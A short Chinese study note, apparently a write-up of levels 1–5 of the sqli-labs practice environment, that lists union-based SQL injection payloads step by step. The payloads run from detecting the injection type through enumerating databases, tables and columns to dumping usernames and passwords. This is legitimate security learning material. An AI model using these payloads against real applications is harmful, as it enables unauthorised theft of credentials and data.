labs-sqli 1-5题小结（虽然感觉还没大懂）

大体做题流程都是：


先判断是字符型还是数字型

?id=1

/*只有输入错误的类型报错我们才知道注入是哪种*/

确认字段位数

?id=1 order by 3

确认占位信息

/*使用基于报错的union联合查询,所以我们把id=1改成-1（一个正常来说肯定不存在的值）那它就能回显出我们要爆的东西*/

?id=-1 union select 1,2,3--+

找库名

?id=-1 union select 1,2,database() --+

找表名

?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+

/*group_concat()函数将组中的字符串连接成为字符串(就可以一次多爆出点我们需要的东西)

找字段名

?id=-1 union select 1,2,group_concat(column_name) from information_schema.COLUMNs where table_schema='security' and table_name='users'--+

找账号密码信息

?id=-1 union select 1,2,group_concat(concat_ws(',',username,password) SEPARATOR '|') from users --+
